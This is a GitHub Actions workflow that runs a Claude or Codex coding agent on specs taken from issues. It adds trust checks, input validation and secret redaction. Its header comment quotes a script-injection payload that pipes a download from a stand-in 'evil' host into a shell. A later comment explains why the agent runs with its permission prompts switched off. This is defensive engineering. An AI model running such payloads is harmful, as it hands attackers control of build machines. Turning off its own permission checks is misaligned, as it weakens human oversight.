name: implw — autonomous spec implementation
# `dispatch_id` (optional) is the correlation token minted by the
# `trigger_implw` MCP tool (FEAT zzv-skills#65). It rides through to the
# run-name so the tool can match the dispatched run back to its caller.
# Declaring the input is required: GitHub returns HTTP 422 on a
# workflow_dispatch carrying an undeclared input (BUG htu-foundation#180).
#
# Trust-boundary hardening (REFACTOR #83): `inputs.issue_number` is the only
# attacker-reachable value in this file that used to be spliced directly
# into a `run:` shell script via `${{ }}` — classic GitHub Actions script
# injection (a value like `1"; curl evil | sh #` would have closed the quote
# and executed arbitrary shell). Every `${{ inputs.* }}` / `${{ steps.*
# .outputs.* }}` value that reaches a `run:` body is now passed through an
# `env:` block instead, and `run-name:` (evaluated by GitHub, never a shell)
# is the one place raw interpolation remains safe.
run-name: "implw #${{ inputs.issue_number }} by @${{ github.actor }} [${{ inputs.dispatch_id }}]"

on:
  workflow_dispatch:
    inputs:
      issue_number:
        description: "GitHub issue number containing the scored spec body"
        required: true
        type: string
      dispatch_id:
        description: "Correlation token from trigger_implw (optional)"
        required: false
        type: string
      provider:
        description: "Execution provider"
        required: false
        type: choice
        options:
          - claude
          - codex
        default: claude
      model:
        description: "Claude model for this implw run"
        required: false
        type: string
        default: claude-sonnet-4-6
      codex_model:
        description: "Optional Codex model override; empty uses the runner default"
        required: false
        type: string
      sparse_paths:
        description: "Newline-separated repo-relative paths for sparse checkout. Leave empty for full checkout (default)."
        required: false
        type: string

permissions:
  contents: write
  pull-requests: write
  issues: write

concurrency:
  group: implw-${{ github.repository }}-${{ inputs.issue_number }}
  cancel-in-progress: false

jobs:
  implw:
    runs-on: [self-hosted, contabo, zilin]
    timeout-minutes: 25
    steps:
      - name: Checkout
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          fetch-depth: ${{ inputs.sparse_paths != '' && 1 || 0 }}
          sparse-checkout: ${{ inputs.sparse_paths }}
          # Do not leave a usable git credential helper behind in the
          # workspace once this job ends — the runner's checkout directory
          # is reused across runs (REFACTOR #83 D4: deterministic cleanup,
          # no persistent credential residue in a shared workspace).
          persist-credentials: false

      - name: Configure git identity
        run: |
          git config user.name  "ZiLin"
          git config user.email "noreply@zzv.io"

      - name: Validate issue input
        id: validate
        env:
          # Passed via env:, never spliced with raw `${{ }}` into the shell
          # script text — see the file-header note (REFACTOR #83).
          ISSUE_NUMBER: ${{ inputs.issue_number }}
        run: |
          set -euo pipefail
          # Fail closed on anything but a strict positive decimal identifier
          # (no sign, no leading zero, no whitespace, no shell metacharacters).
          if ! [[ "$ISSUE_NUMBER" =~ ^[1-9][0-9]*$ ]]; then
            echo "::error::issue_number is not a strict positive decimal identifier"
            exit 1
          fi
          echo "issue_number=$ISSUE_NUMBER" >> "$GITHUB_OUTPUT"

      - name: Verify repository context
        run: |
          set -euo pipefail
          # github.repository reflects the repo this workflow is actually
          # running in (GitHub-controlled, not attacker input) — comparing it
          # to the canonical owner/repo rejects execution from a fork or any
          # other repository this file might get copied into.
          if [ "${{ github.repository }}" != "UzorAI/uzorai.com" ]; then
            echo "::error::unexpected repository context: ${{ github.repository }}"
            exit 1
          fi

      - name: Verify live issue trust (state, author, edits, approval)
        id: verify_issue
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          OWNER="${REPO%%/*}"
          NAME="${REPO##*/}"

          ISSUE_JSON="$(gh issue view "$ISSUE_NUMBER" --repo "$REPO" \
            --json number,state,author,labels,body)"

          NUM=$(jq -r '.number' <<<"$ISSUE_JSON")
          if [ "$NUM" != "$ISSUE_NUMBER" ]; then
            echo "::error::issue number mismatch: requested $ISSUE_NUMBER, got $NUM"
            exit 1
          fi

          # Reject stale/replayed dispatches: a closed issue has already been
          # implemented (or explicitly rejected) and must not be re-run.
          STATE=$(jq -r '.state' <<<"$ISSUE_JSON")
          if [ "$STATE" != "OPEN" ]; then
            echo "::error::issue #$ISSUE_NUMBER is not OPEN (state=$STATE) — refusing a closed/stale/replayed issue"
            exit 1
          fi

          # Defense in depth for Gate 1: the /implw skill itself holds on
          # needs-approval, but a CI-layer check means the HOLD is enforced
          # even if the skill logic is ever bypassed or mis-invoked.
          if jq -e '.labels[] | select(.name == "needs-approval")' <<<"$ISSUE_JSON" >/dev/null; then
            echo "::error::issue #$ISSUE_NUMBER carries needs-approval — Gate 1 HOLD stands until the label is removed"
            exit 1
          fi

          # This repo is public — anyone can open an issue. Require the
          # issue's author to hold at least write access before treating its
          # body as an executable spec.
          AUTHOR=$(jq -r '.author.login' <<<"$ISSUE_JSON")
          PERMISSION=$(gh api "repos/$OWNER/$NAME/collaborators/$AUTHOR/permission" --jq '.permission')
          case "$PERMISSION" in
            admin|maintain|write) : ;;
            *)
              echo "::error::issue #$ISSUE_NUMBER author @$AUTHOR has insufficient repository permission ($PERMISSION)"
              exit 1
              ;;
          esac

          # Reject a bait-and-switch: an approved issue whose body was edited
          # after creation. userContentEdits tracks body/title edits only —
          # unlike updatedAt, it is NOT bumped by label changes, so this does
          # not collide with the needs-approval removal that Gate 1 relies on.
          EDIT_COUNT=$(gh api graphql -f query='
            query($owner:String!, $repo:String!, $num:Int!) {
              repository(owner:$owner, name:$repo) {
                issue(number:$num) { userContentEdits(first: 1) { totalCount } }
              }
            }' -f owner="$OWNER" -f repo="$NAME" -F num="$ISSUE_NUMBER" \
            --jq '.data.repository.issue.userContentEdits.totalCount')
          if [ "$EDIT_COUNT" != "0" ]; then
            echo "::error::issue #$ISSUE_NUMBER body has been edited ($EDIT_COUNT edit(s)) since creation — rejecting"
            exit 1
          fi

          BODY_HASH=$(jq -r '.body' <<<"$ISSUE_JSON" | sha256sum | cut -d' ' -f1)
          echo "body_hash=$BODY_HASH" >> "$GITHUB_OUTPUT"

          SPEC_PATH="$(mktemp -t "implw-spec-${ISSUE_NUMBER}-XXXX.md")"
          jq -r '.body' <<<"$ISSUE_JSON" > "$SPEC_PATH"

          # Shared-runner /tmp defense: refuse a symlinked or path-traversed
          # temp file (a concurrent job on the same self-hosted box could
          # otherwise race a symlink into place between creation and use).
          if [ -L "$SPEC_PATH" ]; then
            echo "::error::spec path resolved to a symlink — refusing"
            exit 1
          fi
          case "$(realpath -m "$SPEC_PATH")" in
            "$(realpath -m "${TMPDIR:-/tmp}")"/*) : ;;
            *) echo "::error::spec path escaped the expected temp directory"; exit 1 ;;
          esac
          test -s "$SPEC_PATH"
          echo "spec_path=$SPEC_PATH" >> "$GITHUB_OUTPUT"

      - name: Re-verify content hash immediately before execution
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPO: ${{ github.repository }}
          EXPECTED_HASH: ${{ steps.verify_issue.outputs.body_hash }}
        run: |
          set -euo pipefail
          # TOCTOU guard: re-fetch and re-hash the body right before handing
          # control to claude, so an edit landing between validation and
          # execution is caught even though userContentEdits already passed.
          CURRENT_HASH=$(gh issue view "$ISSUE_NUMBER" --repo "$REPO" --json body --jq .body | sha256sum | cut -d' ' -f1)
          if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
            echo "::error::issue #$ISSUE_NUMBER body changed between validation and execution — refusing"
            exit 1
          fi

      - name: Prepare completion-evidence manifest path
        id: prepare_manifest
        run: |
          set -euo pipefail
          NO_CHANGE_MANIFEST_PATH="$(mktemp -t "implw-no-change-XXXX.json")"
          echo "no_change_manifest_path=$NO_CHANGE_MANIFEST_PATH" >> "$GITHUB_OUTPUT"

      - name: Run implw via claude (subscription mode)
        id: claude_run
        if: inputs.provider == 'claude'
        timeout-minutes: 22
        env:
          SPEC_PATH: ${{ steps.verify_issue.outputs.spec_path }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPOSITORY: ${{ github.repository }}
          RUN_ID: ${{ github.run_id }}
          HEARTBEAT_INTERVAL_RAW: ${{ vars.IMPLW_HEARTBEAT_INTERVAL_SECONDS }}
          HEARTBEAT_STALL_WINDOW_RAW: ${{ vars.IMPLW_HEARTBEAT_STALL_WINDOW_SECONDS }}
          CLAUDE_MODEL_INPUT: ${{ inputs.model }}
          NO_CHANGE_MANIFEST_PATH: ${{ steps.prepare_manifest.outputs.no_change_manifest_path }}
        # No GH_TOKEN env: claude inherits the self-hosted runner's persistent
        # `gh auth` (operator PAT), which is what enables `gh pr create` to
        # trigger downstream workflow_dispatch (GitHub anti-recursion bypasses
        # the run-scoped GITHUB_TOKEN, not a user PAT). This is the one
        # documented, reviewed exception to "no inherited host auth" (D2):
        # eliminating it needs a scoped GitHub App / installation token
        # provisioned on the runner, which is a runner-credential change and
        # explicitly out of scope for this PR (see Rollback: "any runner
        # rebuild or rotation is human-operated"). Every other credential use
        # in this workflow (issue read/verify, failure comment) now runs on
        # the run-scoped GITHUB_TOKEN instead of inherited auth.
        run: |
          set -euo pipefail
          # Enforce subscription auth: Claude Code precedence is
          # cloud-flags > ANTHROPIC_AUTH_TOKEN > ANTHROPIC_API_KEY > apiKeyHelper > subscription.
          # Unset the two env-clearable layers (docs-prescribed; empty string is not
          # documented as equivalent to unset). Cloud-provider flags cannot be
          # neutralized, so fail loud if any are set. See BUG htu-foundation#185.
          unset ANTHROPIC_API_KEY ANTHROPIC_AUTH_TOKEN
          if [ -n "${CLAUDE_CODE_USE_BEDROCK:-}${CLAUDE_CODE_USE_VERTEX:-}${CLAUDE_CODE_USE_FOUNDRY:-}" ]; then
            echo "::error::cloud-provider routing flag set — subscription mode bypassed"; exit 2
          fi
          if [ -n "${ANTHROPIC_API_KEY:-}${ANTHROPIC_AUTH_TOKEN:-}" ]; then
            echo "::error::credential env still set after unset — subscription mode bypassed"; exit 2
          fi
          echo "claude auth mode: subscription (API key + auth token cleared)"
          # The GitHub self-hosted runner caches its launch-time PATH in `.path`.
          # After a `claude` install/update on the host, that cache stays stale until
          # the runner unit restarts, producing exit 127. Prepending the npm-global
          # bin here removes the restart-after-install dependency; the guard fails
          # loud if `claude` is still unresolvable. See CHORE htu-foundation#186.
          export PATH="$HOME/.npm-global/bin:$PATH"
          command -v claude >/dev/null || { echo "::error::claude not found on PATH"; exit 127; }
          # --dangerously-skip-permissions is required in CI: headless `claude -p`
          # does not honor repo-committed `defaultMode: bypassPermissions` (a repo
          # cannot self-grant bypass), so without the flag the agent falls back to
          # ask-mode, blocks on the first gated tool, and times out against
          # `< /dev/null`. See BUG htu-foundation#189; verified remedy in
          # streettt.com#970.
          RAW_LOG="$(mktemp -t "implw-claude-${ISSUE_NUMBER}-XXXX.jsonl")"
          TELEMETRY_PATH=".implw/telemetry/claude-${RUN_ID}-first.json"
          DIAGNOSTIC_PATH=".implw/telemetry/claude-${RUN_ID}-first.diagnostic.jsonl"
          HEARTBEAT_INTERVAL_SECONDS="${HEARTBEAT_INTERVAL_RAW:-60}"
          HEARTBEAT_STALL_WINDOW_SECONDS="${HEARTBEAT_STALL_WINDOW_RAW:-120}"
          HEARTBEAT_PID=""
          stop_heartbeat() {
            if [ -n "$HEARTBEAT_PID" ]; then
              kill "$HEARTBEAT_PID" 2>/dev/null || true
              wait "$HEARTBEAT_PID" 2>/dev/null || true
              HEARTBEAT_PID=""
            fi
          }
          cleanup_runtime() {
            stop_heartbeat
            rm -f "$RAW_LOG"
          }
          trap cleanup_runtime EXIT INT TERM

          START_TS=$(date +%s)
          echo "::notice title=implw timeline::event=provider_started issue=$ISSUE_NUMBER provider=claude phase=implementation status=started elapsed_seconds=0 detail=running"
          set +e
          timeout 20m claude --model "$CLAUDE_MODEL_INPUT" --dangerously-skip-permissions --debug --verbose --output-format stream-json -p "/implw $SPEC_PATH" < /dev/null > "$RAW_LOG" 2>&1 &
          PROVIDER_PID=$!
          ./scripts/implw-provider-heartbeat.sh "$PROVIDER_PID" claude "$RAW_LOG" "$HEARTBEAT_INTERVAL_SECONDS" "$HEARTBEAT_STALL_WINDOW_SECONDS" "$ISSUE_NUMBER" &
          HEARTBEAT_PID=$!
          wait "$PROVIDER_PID"
          CLAUDE_EXIT=$?
          stop_heartbeat
          set -e
          ELAPSED=$(( $(date +%s) - START_TS ))
          if [ "$CLAUDE_EXIT" = 0 ]; then PROVIDER_STATUS=success; else PROVIDER_STATUS=failed; fi
          echo "implw_provider_heartbeat provider=claude issue=$ISSUE_NUMBER status=completed provider_exit=$CLAUDE_EXIT elapsed_seconds=$ELAPSED"
          echo "::notice title=implw timeline::event=provider_completed issue=$ISSUE_NUMBER provider=claude phase=implementation status=$PROVIDER_STATUS elapsed_seconds=$ELAPSED detail=exit_$CLAUDE_EXIT"

          if ./scripts/implw-claude-telemetry.sh "$RAW_LOG" "$TELEMETRY_PATH" "$DIAGNOSTIC_PATH" first unknown "$REPOSITORY" "$RUN_ID" "$ISSUE_NUMBER" "$CLAUDE_EXIT"; then
            echo "telemetry_path=$TELEMETRY_PATH" >> "$GITHUB_OUTPUT"
            echo "diagnostic_path=$DIAGNOSTIC_PATH" >> "$GITHUB_OUTPUT"
            jq -c . "$TELEMETRY_PATH" | sed 's/^/implw_claude_telemetry=/'
          else
            echo "::warning title=implw Claude telemetry::usage extraction failed; provider outcome is unchanged"
          fi
          # Generate redacted transcript tail before discarding RAW_LOG so that a
          # completion-evidence failure can attach readable diagnostics (BUG #133 AC2).
          # Extracts the last ~64 KB of assistant/user text turns and redacts
          # well-known secret patterns (GH tokens, Anthropic API keys).
          TRANSCRIPT_TAIL_PATH="$(mktemp -t "implw-transcript-tail-${ISSUE_NUMBER}-XXXX.txt")"
          jq -Rrc 'fromjson? | select(type == "object") |
            select(.type == "assistant" or .type == "user") |
            (.type + ": ") + ([ (.message.content // [])[] | select(.type == "text") | .text ] | join(""))
          ' "$RAW_LOG" 2>/dev/null \
            | tail -c 65536 \
            | sed -E \
                -e 's/ghp_[A-Za-z0-9]{36}/[GH_TOKEN_REDACTED]/g' \
                -e 's/ghs_[A-Za-z0-9]{36,}/[GH_TOKEN_REDACTED]/g' \
                -e 's/sk-ant-[A-Za-z0-9_-]{40,}/[ANTHROPIC_KEY_REDACTED]/g' \
            > "$TRANSCRIPT_TAIL_PATH" 2>/dev/null || true
          echo "transcript_tail_path=$TRANSCRIPT_TAIL_PATH" >> "$GITHUB_OUTPUT"
          rm -f "$RAW_LOG"
          trap - EXIT INT TERM
          echo "claude_exit=$CLAUDE_EXIT" >> "$GITHUB_OUTPUT"
          exit "$CLAUDE_EXIT"

      - name: Run implw via Codex (subscription mode)
        id: codex_run
        if: inputs.provider == 'codex'
        timeout-minutes: 22
        env:
          SPEC_PATH: ${{ steps.verify_issue.outputs.spec_path }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPOSITORY: ${{ github.repository }}
          RUN_ID: ${{ github.run_id }}
          HEARTBEAT_INTERVAL_RAW: ${{ vars.IMPLW_HEARTBEAT_INTERVAL_SECONDS }}
          HEARTBEAT_STALL_WINDOW_RAW: ${{ vars.IMPLW_HEARTBEAT_STALL_WINDOW_SECONDS }}
          CODEX_MODEL_INPUT: ${{ inputs.codex_model }}
          NO_CHANGE_MANIFEST_PATH: ${{ steps.prepare_manifest.outputs.no_change_manifest_path }}
        # Like the Claude step, Codex intentionally inherits the runner's
        # human-managed provider session and gh authentication. No credential
        # value is read, printed, persisted, or uploaded by this workflow.
        run: |
          set -euo pipefail
          export PATH="$HOME/.npm-global/bin:$PATH"
          if ! command -v codex >/dev/null; then
            echo "codex_exit=127" >> "$GITHUB_OUTPUT"
            echo "::error::codex not found on PATH"
            exit 127
          fi
          set +e
          AUTH_DETAIL="$(./scripts/codex-auth-preflight.sh)"
          AUTH_EXIT=$?
          set -e
          if [ "$AUTH_EXIT" != 0 ]; then
            echo "codex_exit=127" >> "$GITHUB_OUTPUT"
            echo "::error::${AUTH_DETAIL:-codex auth preflight failed}"
            exit 127
          fi

          RAW_CAPTURE="$(mktemp -t "implw-codex-${ISSUE_NUMBER}-XXXX.jsonl")"
          TELEMETRY_PATH=".implw/telemetry/codex-${RUN_ID}-first.json"
          HEARTBEAT_INTERVAL_SECONDS="${HEARTBEAT_INTERVAL_RAW:-60}"
          HEARTBEAT_STALL_WINDOW_SECONDS="${HEARTBEAT_STALL_WINDOW_RAW:-120}"
          HEARTBEAT_PID=""
          stop_heartbeat() {
            if [ -n "$HEARTBEAT_PID" ]; then
              kill "$HEARTBEAT_PID" 2>/dev/null || true
              wait "$HEARTBEAT_PID" 2>/dev/null || true
              HEARTBEAT_PID=""
            fi
          }
          cleanup_runtime() {
            stop_heartbeat
            rm -f "$RAW_CAPTURE"
          }
          trap cleanup_runtime EXIT INT TERM

          CODEX_PROMPT="$(printf '%s\n' \
            "Read .claude/commands/implw.md in full and follow its governed procedure for the scored issue spec at $SPEC_PATH." \
            "Repository: $REPOSITORY" \
            "Issue: #$ISSUE_NUMBER" \
            "The workflow has exported NO_CHANGE_MANIFEST_PATH. If the spec genuinely requires no change, write the required reason/evidence JSON manifest there. Otherwise complete the command through branch push and PR creation. Do not deploy.")"
          CODEX_ARGS=(exec --json --ephemeral --sandbox workspace-write \
            -c shell_environment_policy.inherit=all \
            -c sandbox_workspace_write.network_access=true)
          if [ -n "$CODEX_MODEL_INPUT" ]; then
            CODEX_ARGS+=(--model "$CODEX_MODEL_INPUT")
          fi

          START_TS="$(date +%s)"
          STARTED_AT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          echo "::notice title=implw timeline::event=provider_started issue=$ISSUE_NUMBER provider=codex phase=implementation status=started elapsed_seconds=0 detail=running"
          set +e
          timeout 20m codex "${CODEX_ARGS[@]}" "$CODEX_PROMPT" < /dev/null > "$RAW_CAPTURE" 2>&1 &
          PROVIDER_PID=$!
          ./scripts/implw-provider-heartbeat.sh "$PROVIDER_PID" codex "$RAW_CAPTURE" "$HEARTBEAT_INTERVAL_SECONDS" "$HEARTBEAT_STALL_WINDOW_SECONDS" "$ISSUE_NUMBER" &
          HEARTBEAT_PID=$!
          wait "$PROVIDER_PID"
          CODEX_EXIT=$?
          stop_heartbeat
          set -e
          ELAPSED=$(( $(date +%s) - START_TS ))
          COMPLETED_AT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          if [ "$CODEX_EXIT" = 0 ]; then PROVIDER_STATUS=success; else PROVIDER_STATUS=failed; fi
          echo "implw_provider_heartbeat provider=codex issue=$ISSUE_NUMBER status=completed provider_exit=$CODEX_EXIT elapsed_seconds=$ELAPSED"
          echo "::notice title=implw timeline::event=provider_completed issue=$ISSUE_NUMBER provider=codex phase=implementation status=$PROVIDER_STATUS elapsed_seconds=$ELAPSED detail=exit_$CODEX_EXIT"

          if ./scripts/implw-codex-telemetry.sh "$RAW_CAPTURE" "$TELEMETRY_PATH" "$REPOSITORY" "$RUN_ID" "$ISSUE_NUMBER" "$CODEX_EXIT" "$CODEX_MODEL_INPUT" "$STARTED_AT" "$COMPLETED_AT" "$((ELAPSED * 1000))"; then
            echo "telemetry_path=$TELEMETRY_PATH" >> "$GITHUB_OUTPUT"
            jq -c . "$TELEMETRY_PATH" | sed 's/^/implw_codex_telemetry=/'
          else
            echo "::warning title=implw Codex telemetry::usage extraction failed; provider outcome is unchanged"
          fi
          rm -f "$RAW_CAPTURE"
          trap - EXIT INT TERM
          echo "codex_exit=$CODEX_EXIT" >> "$GITHUB_OUTPUT"
          exit "$CODEX_EXIT"

      - name: Validate completion evidence
        id: completion_evidence
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITHUB_REPOSITORY: ${{ github.repository }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          NO_CHANGE_MANIFEST_PATH: ${{ steps.prepare_manifest.outputs.no_change_manifest_path }}
          REQUESTED_PROVIDER: ${{ inputs.provider }}
          RESOLVED_PROVIDER: ${{ inputs.provider }}
        run: |
          set -euo pipefail
          export PATH="$HOME/.npm-global/bin:$PATH"
          node scripts/require-implw-completion-evidence.mjs

      - name: Upload Claude usage telemetry
        if: always() && steps.claude_run.outputs.telemetry_path != ''
        continue-on-error: true
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: claude-usage-${{ github.run_id }}-first
          path: |
            ${{ steps.claude_run.outputs.telemetry_path }}
            ${{ steps.claude_run.outputs.diagnostic_path }}
          if-no-files-found: warn

      - name: Upload transcript tail on completion-evidence failure
        if: failure() && steps.completion_evidence.outcome == 'failure' && steps.claude_run.outputs.transcript_tail_path != ''
        continue-on-error: true
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: claude-transcript-tail-${{ github.run_id }}
          path: ${{ steps.claude_run.outputs.transcript_tail_path }}
          if-no-files-found: warn

      - name: Upload Codex usage telemetry
        if: always() && steps.codex_run.outputs.telemetry_path != ''
        continue-on-error: true
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: codex-usage-${{ github.run_id }}-first
          path: ${{ steps.codex_run.outputs.telemetry_path }}
          if-no-files-found: warn

      - name: Cleanup spec tmp file
        if: always()
        env:
          SPEC_PATH: ${{ steps.verify_issue.outputs.spec_path }}
        run: rm -f "$SPEC_PATH"

      - name: Comment failure on issue
        if: failure()
        env:
          # Same-repo `gh issue comment` — GITHUB_TOKEN is auto-issued and
          # always valid. Scoping per REFACTOR htu-foundation#192 keeps the
          # failure-reporting path from itself failing on a stale PAT.
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PROVIDER: ${{ inputs.provider }}
          CLAUDE_EXIT: ${{ steps.claude_run.outputs.claude_exit }}
          CODEX_EXIT: ${{ steps.codex_run.outputs.codex_exit }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPO: ${{ github.repository }}
          COMPLETION_OK: ${{ steps.completion_evidence.outputs.completion_ok }}
          COMPLETION_CLASSIFICATION: ${{ steps.completion_evidence.outputs.completion_classification }}
          COMPLETION_REASON: ${{ steps.completion_evidence.outputs.completion_reason }}
        run: |
          RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          PROVIDER_EXIT="$CLAUDE_EXIT"
          if [ "$PROVIDER" = "codex" ]; then PROVIDER_EXIT="$CODEX_EXIT"; fi
          if [ "${PROVIDER_EXIT:-}" = "124" ]; then
            BODY="implw $PROVIDER hit timeout (exit 124) — investigate runner state and provider auth. Logs: $RUN_URL"
          elif [ "${COMPLETION_OK:-}" = "false" ]; then
            BODY="implw $PROVIDER completion evidence gate failed (${COMPLETION_CLASSIFICATION:-missing_completion_evidence}): ${COMPLETION_REASON:-no evidence found}. Logs: $RUN_URL"
          else
            BODY="implw $PROVIDER run failed (exit ${PROVIDER_EXIT:-unknown}) — see logs: $RUN_URL"
          fi
          gh issue comment "$ISSUE_NUMBER" \
            --repo "$REPO" \
            --body "$BODY"

      - name: Comment no-change completion on issue
        if: steps.completion_evidence.outputs.completion_classification == 'no_change_verified'
        continue-on-error: true
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
          REPO: ${{ github.repository }}
          NO_CHANGE_MANIFEST_PATH: ${{ steps.prepare_manifest.outputs.no_change_manifest_path }}
        run: |
          RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          if [ -s "$NO_CHANGE_MANIFEST_PATH" ]; then
            REASON="$(jq -r '.reason // "(no reason recorded)"' "$NO_CHANGE_MANIFEST_PATH")"
            EVIDENCE="$(jq -r '.evidence // "(no evidence recorded)"' "$NO_CHANGE_MANIFEST_PATH")"
          else
            REASON="(manifest not available)"
            EVIDENCE="(manifest not available)"
          fi
          BODY="$(printf 'implw completed — no change needed.\n\n**Reason:** %s\n\n**Evidence:** %s\n\nRun: %s' "$REASON" "$EVIDENCE" "$RUN_URL")"
          gh issue comment "$ISSUE_NUMBER" \
            --repo "$REPO" \
            --body "$BODY"
